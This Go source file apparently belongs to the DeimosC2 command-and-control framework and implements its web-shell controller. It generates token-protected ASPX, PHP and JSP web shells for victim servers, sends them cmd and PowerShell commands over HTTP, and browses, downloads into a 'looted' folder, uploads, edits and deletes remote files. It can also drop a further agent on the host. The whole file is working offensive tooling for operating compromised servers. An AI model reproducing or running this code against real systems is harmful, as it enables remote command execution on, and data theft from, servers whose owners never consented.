package webshells

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/DeimosC2/DeimosC2/c2/lib/sqldb"
	"github.com/DeimosC2/DeimosC2/c2/lib/validation"
	"github.com/DeimosC2/DeimosC2/c2/webserver/websockets"
	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/gorilla/websocket"
	uuid "github.com/satori/go.uuid"
)

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
var requestBody string

//AllWebShells is a global variable that holds all the webshells
var AllWebShells = &WebShells{mutex: sync.RWMutex{}, list: map[string]*WebShell{}}

//WebShells is the struct for a list of all agents
type WebShells struct {
	mutex sync.RWMutex
	list  map[string]*WebShell
}

//WebShell struct is the datatype
type WebShell struct {
	UUID      string //WebShell UUID4 name
	URL       string //Agent Path
	AuthToken string //WebShell Authtoken
	OS        string //WebShell's OS
	Hostname  string //WebShell's hostname
	Username  string //Username of victim
	LocalIP   string //Local IP
	Domain    string //WebShell's domain
}

//webShellPost struct is for all requests except generate, init, or listshells
type webShellPost struct {
	UUID    string
	Options []string
}

//webShellInit struct is for the API call init
type webShellInit struct {
	URL       string
	AuthToken string
}

func randSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

//ReInitWebShells brings active webshells back into memory
func ReInitWebShells() {
	wRows := sqldb.ListWebShell()
	for wRows.Next() {
		var oldWebShells WebShell
		err := wRows.Scan(&oldWebShells.URL, &oldWebShells.AuthToken, &oldWebShells.UUID, &oldWebShells.OS, &oldWebShells.Hostname, &oldWebShells.Username, &oldWebShells.LocalIP, &oldWebShells.Domain)
		if err != nil {
			logging.ErrorLogger.Println(err.Error())
		}
		AllWebShells.list[oldWebShells.UUID] = &oldWebShells
	}
}

//GenerateShell adds the UUID password for the web shell chosen
func generateShell(shell string) (bool, string) {
	//Make the string lowercase so comparisons just work
	shellType := strings.ToLower(shell)

	//Identify which shell type was choosen and set the variable shellType to a static varaible or return an error
	//This also ensures user submitted data can't have path traversal
	if strings.Contains(shellType, "aspx") {
		shellType = "aspx"
	} else if strings.Contains(shellType, "php") {
		shellType = "php"
	} else if strings.Contains(shellType, "jsp") {
		shellType = "jsp"
	} else {
		return false, "Bad Shell type submitted"
	}

	//Check to ensure generated folder is created
	cwd, err := os.Getwd()
	if err != nil {
		return false, err.Error()
	}

	if _, err := os.Stat(path.Join(cwd, "resources", "webshells", "generated")); os.IsNotExist(err) {
		os.Mkdir(path.Join(cwd, "resources", "webshells", "generated"), 0755)
	}

	//Generate random UUIDv4 that will be used as the password for the webshell
	token := uuid.NewV4()

	//Read webshell template from what is passed
	input, err := ioutil.ReadFile(path.Join(cwd, "resources", "webshells", "shell."+shellType))
	if err != nil {
		return false, err.Error()
	}

	err = ioutil.WriteFile(path.Join(cwd, "resources", "webshells", "generated", "shell."+shellType), []byte(input), 0755)
	if err != nil {
		return false, err.Error()
	}

	read, err := ioutil.ReadFile(path.Join(cwd, "resources", "webshells", "generated", "shell."+shellType))
	if err != nil {
		return false, err.Error()
	}

	//Replace {TOKEN} with the generated UUIDv4
	output := strings.Replace(string(read), "{TOKEN}", token.String(), -1)

	rand.Seed(time.Now().UnixNano())
	filename := path.Join(cwd, "resources", "webshells", "generated", randSeq(25)+"."+shellType)

	//Write the new webshell
	err = ioutil.WriteFile(filename, []byte(output), 0755)
	if err != nil {
		return false, err.Error()
	}

	err = os.Remove(path.Join(cwd, "resources", "webshells", "generated", "shell."+shellType))
	if err != nil {
		return false, err.Error()
	}

	data := path.Join("/", "generated", filepath.Base(filename))

	return true, data
}

//InitCall will process the init request made by the user on first sending the webshell
func initCall(url string, authToken string) (bool, string, string) {
	//Set webshell unique key
	webShellKey := uuid.NewV4()

	//Prep the init POST request
	requestBody := "auth_token=" + authToken + "&action=init"
	//Sent the POST request
	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(requestBody)))
	if err != nil {
		return false, err.Error(), ""
	}

	defer resp.Body.Close()

	//Read all the response of the POST request
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err.Error(), ""
	}

	//Put the response in the struct
	wShellI := WebShell{}
	err = json.Unmarshal([]byte(body), &wShellI)
	if err != nil {
		return false, err.Error(), ""
	}

	wShellI.URL = url
	wShellI.AuthToken = authToken
	wShellI.UUID = webShellKey.String()

	AllWebShells.mutex.Lock()
	defer AllWebShells.mutex.Unlock()
	AllWebShells.list[wShellI.UUID] = &wShellI

	//Add it to the DB
	sqldb.AddWebshell(wShellI.URL, wShellI.AuthToken, wShellI.UUID, wShellI.OS, wShellI.Hostname, wShellI.Username, wShellI.LocalIP, wShellI.Domain)

	//Create looted folder for downloaded files and other looted data from the webshell
	//Get working directory
	cwd, err := os.Getwd()
	if err != nil {
		return false, err.Error(), ""
	}

	//Check to ensure directory doesn't exist
	if _, err := os.Stat(path.Join(cwd, "resources", "looted", wShellI.UUID)); os.IsNotExist(err) {
		//Make the directory
		os.Mkdir(path.Join(cwd, "resources", "looted", wShellI.UUID), 0755)
	}

	//Make the directory for where downloaded files will be placed
	fullPath := path.Join(cwd, "resources", "looted", wShellI.UUID, "files")
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		os.Mkdir(fullPath, 0755)
	}

	return true, string(body), webShellKey.String()
}

//ExecuteCommmand executes the POST request and receives the response
func executeCommmand(name string, cmdType string, cmd string) (bool, string) {
	AllWebShells.mutex.Lock()
	defer AllWebShells.mutex.Unlock()
	if val, ok := AllWebShells.list[name]; ok {
		if cmdType == "cmd" {
			requestBody = "auth_token=" + val.AuthToken + "&action=cmd&command=" + cmd
		} else {
			requestBody = "auth_token=" + val.AuthToken + "&action=power&command=" + cmd
		}

		resp, err := http.Post(val.URL, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(requestBody)))
		if err != nil {
			return false, err.Error()
		}

		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return false, err.Error()
		}

		return true, string(body)
	}
	return false, "Wrong webshell UUID"
}

//FileBrowser shows files in directory, removes a file, downloads a file, or makes a directory
func fileBrowser(name string, filePath string, method string) (bool, string, string) {
	AllWebShells.mutex.Lock()
	defer AllWebShells.mutex.Unlock()
	if val, ok := AllWebShells.list[name]; ok {
		switch {
		case method == "":
			requestBody = "auth_token=" + val.AuthToken + "&action=filebrowser&path=" + filePath
		case method == "remove":
			requestBody = "auth_token=" + val.AuthToken + "&action=filebrowser&path=" + filePath + "&method=remove"
		case method == "download":
			requestBody = "auth_token=" + val.AuthToken + "&action=filebrowser&path=" + filePath + "&method=download"
		case method == "mkdir":
			requestBody = "auth_token=" + val.AuthToken + "&action=filebrowser&path=" + filePath + "&method=mkdir"
		}

		resp, err := http.Post(val.URL, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(requestBody)))
		if err != nil {
			return false, err.Error(), method
		}

		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return false, err.Error(), method
		}

		if method == "download" {
			cwd, err := os.Getwd()
			if err != nil {
				logging.ErrorLogger.Println(err.Error())
			}
			//Save the downloaded file to the looted directory
			filePath := path.Join(cwd, "resources", "looted", val.UUID, "files", filepath.Base(filePath))
			fileName := fmt.Sprintf(filePath)
			file, _ := os.Create(fileName)
			_, err = file.Write(body)
			if err != nil {
				return false, err.Error(), method
			}
			rData := path.Join("/", "looted", val.UUID, "files", filepath.Base(filePath))
			//Return the file to the FE
			return true, string(rData), method
		}
		return true, string(body), method
	}
	return false, "Wrong webshell UUID", method
}

//FileUpload uploads a file to the victim webserver
func fileUpload(name string, uploadFile string, filePath string, uploadData string) (bool, string) {
	AllWebShells.mutex.Lock()
	defer AllWebShells.mutex.Unlock()
	if val, ok := AllWebShells.list[name]; ok {
		bodyBuf := &bytes.Buffer{}
		bodyWriter := multipart.NewWriter(bodyBuf)

		if uploadData == "" {
			return false, "No upload data sent"
		}

		auth, err := bodyWriter.CreateFormField("auth_token")
		if err != nil {
			return false, err.Error()
		}
		auth.Write([]byte(val.AuthToken))

		action, err := bodyWriter.CreateFormField("action")
		if err != nil {
			return false, err.Error()
		}
		action.Write([]byte("filebrowser"))

		pth, err := bodyWriter.CreateFormField("path")
		if err != nil {
			return false, err.Error()
		}
		pth.Write([]byte(filePath + filepath.Base(uploadFile)))

		mth, err := bodyWriter.CreateFormField("method")
		if err != nil {
			return false, err.Error()
		}
		mth.Write([]byte("upload"))

		// this step is very important
		fileWriter, err := bodyWriter.CreateFormFile("file", filepath.Base(uploadFile))
		if err != nil {
			return false, err.Error()
		}

		//Read b64 and stream to NewReader
		fh := bytes.NewReader([]byte(uploadData))

		//iocopy
		_, err = io.Copy(fileWriter, fh)
		if err != nil {
			return false, err.Error()
		}

		contentType := bodyWriter.FormDataContentType()
		bodyWriter.Close()

		resp, err := http.Post(val.URL, contentType, bodyBuf)
		if err != nil {
			return false, err.Error()
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return false, err.Error()
		}
		return true, string(body)
	}
	return false, "Wrong webshell UUID"
}

//FileEditor edits or reads a file
func fileEditor(name string, filePath string, method string, text string) (bool, string) {
	AllWebShells.mutex.Lock()
	defer AllWebShells.mutex.Unlock()
	if val, ok := AllWebShells.list[name]; ok {
		switch {
		case method == "read":
			requestBody = "auth_token=" + val.AuthToken + "&action=editor&path=" + filePath + "&method=read"
		case method == "write":
			encoded := base64.StdEncoding.EncodeToString([]byte(text))
			requestBody = "auth_token=" + val.AuthToken + "&action=editor&path=" + filePath + "&method=write&text=" + encoded
		}
		resp, err := http.Post(val.URL, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(requestBody)))
		if err != nil {
			return false, err.Error()
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return false, err.Error()
		}
		return true, string(body)
	}
	return false, "Wrong webshell UUID"
}

//DeleteShell deletes the webshell
func deleteShell(name string) (bool, string) {
	AllWebShells.mutex.Lock()
	defer AllWebShells.mutex.Unlock()
	if val, ok := AllWebShells.list[name]; ok {
		requestBody := "auth_token=" + val.AuthToken + "&action=endgame"

		resp, err := http.Post(val.URL, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(requestBody)))
		if err != nil {
			return false, err.Error()
		}

		defer resp.Body.Close()
		sqldb.WebShellDeactivate(name)
		delete(AllWebShells.list, name)
		return true, "Deleted"
	}
	return false, "Wrong webshell UUID"
}

//DeployAgent deploys an agent picked by the user and deletes the webshell
func deployAgent(name string, uploadFile string, filename string, uploadData string) bool {
	fileUpload(name, uploadFile, filename, uploadData)
	deleteShell(name)
	return true
}

//ParseSocket takes in data from the websocket, acts on it and then alerts the user of the outcome
func ParseSocket(fname string, data interface{}, ws *websocket.Conn) {
	//List webshells
	if fname == "list" {
		AllWebShells.mutex.Lock()
		defer AllWebShells.mutex.Unlock()
		wsList := []string{}

		for _, v := range AllWebShells.list {
			newMsg, _ := json.Marshal(v)
			wsList = append(wsList, string(newMsg))

		}
		msg, _ := json.Marshal(wsList)
		outMsg := websockets.SendMessage{
			Type:         "webshell",
			FunctionName: "list",
			Data:         string(msg),
			Success:      true,
		}
		websockets.AlertSingleUser(outMsg, ws)
		return
	}

	m := data.(map[string]interface{})

	//Generate the shell based on the Type sent from the FE
	if fname == "generateshell" {
		if !validation.ValidateMapAlert(m, []string{"type"}, ws) {
			return
		}
		success, filePath := generateShell(m["type"].(string))

		toSend := struct {
			Path string `json:"path"`
		}{
			Path: filePath,
		}
		msg, _ := json.Marshal(toSend)

		outMsg := websockets.SendMessage{
			Type:         "webshell",
			FunctionName: "generateshell",
			Data:         string(msg),
			Success:      success,
		}
		websockets.AlertSingleUser(outMsg, ws)
		return
	}

	//Init the webshell after placing it on the victim server using the victim URL and the webshells AuthToken
	if fname == "init" {
		if !validation.ValidateMapAlert(m, []string{"url", "authtoken"}, ws) {
			return
		}
		success, rData, UUID := initCall(m["url"].(string), m["authtoken"].(string))
		output := WebShellInitResponse{
			UUID:      UUID,
			URL:       m["url"].(string),
			AuthToken: m["authtoken"].(string),
			InitData:  rData,
		}
		output.SendToFE(success, ws)

	} else {
		if !validation.ValidateMapAlert(m, []string{"uuid", "options"}, ws) {
			return
		}

		var options []string
		switch val := m["options"].(type) {
		case []interface{}:
			for _, x := range val {
				options = append(options, x.(string))
			}
		}

		wShell := webShellPost{
			UUID:    m["uuid"].(string),
			Options: options,
		}

		//Functions of the webshell
		if fname == "executecommand" {
			success, rData := executeCommmand(wShell.UUID, wShell.Options[0], wShell.Options[1])
			outMsg := websockets.SendMessage{
				Type:         "webshell",
				FunctionName: "executecommand",
				Data:         rData,
				Success:      success,
			}
			websockets.AlertSingleUser(outMsg, ws)

		} else if fname == "filebrowser" {
			success, rData, method := fileBrowser(wShell.UUID, wShell.Options[0], wShell.Options[1])
			output := WebShellFileBrowserResponse{
				UUID:     wShell.UUID,
				Method:   method,
				InitData: []string{rData},
			}
			output.SendToFE(success, ws)
		} else if fname == "fileupload" {
			success, rData := fileUpload(wShell.UUID, wShell.Options[0], wShell.Options[1], wShell.Options[2])
			outMsg := websockets.SendMessage{
				Type:         "webshell",
				FunctionName: "fileupload",
				Data:         rData,
				Success:      success,
			}
			websockets.AlertSingleUser(outMsg, ws)
		} else if fname == "fileeditor" {
			success, rData := fileEditor(wShell.UUID, wShell.Options[0], wShell.Options[1], wShell.Options[2])
			outMsg := websockets.SendMessage{
				Type:         "webshell",
				FunctionName: "fileeditor",
				Data:         rData,
				Success:      success,
			}
			websockets.AlertSingleUser(outMsg, ws)
		} else if fname == "deleteshell" {
			success, rData := deleteShell(wShell.UUID)
			outMsg := websockets.SendMessage{
				Type:         "webshell",
				FunctionName: "deleteshell",
				Data:         rData,
				Success:      success,
			}
			websockets.AlertSingleUser(outMsg, ws)
		} else if fname == "deployagent" {
			success := deployAgent(wShell.UUID, wShell.Options[0], wShell.Options[1], wShell.Options[2])
			outMsg := websockets.SendMessage{
				Type:         "webshell",
				FunctionName: "deployagent",
				Data:         "",
				Success:      success,
			}
			websockets.AlertSingleUser(outMsg, ws)
		}
	}
}
